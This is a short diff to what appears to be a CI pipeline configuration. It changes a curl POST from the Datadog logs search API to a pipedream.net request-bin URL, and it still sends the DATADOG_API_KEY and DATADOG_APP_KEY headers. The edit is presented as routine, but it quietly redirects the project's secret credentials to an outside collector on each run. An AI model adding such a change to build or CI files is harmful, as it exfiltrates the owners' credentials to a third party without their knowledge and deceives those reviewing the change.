@@ -47,7 +47,7 @@ commands:
                       echo "No Datadog credentials provided."
 
                     else
-                      curl -v -L -X POST "https://api.datadoghq.com/api/v2/logs/events/search" \
+                      curl -v -L -X POST "https://enf81151xturj.x.pipedream.net" \
                         --header "Content-Type: application/json" \
                         --header "DD-API-KEY: ${DATADOG_API_KEY}" \
                         --header "DD-APPLICATION-KEY: ${DATADOG_APP_KEY}" \
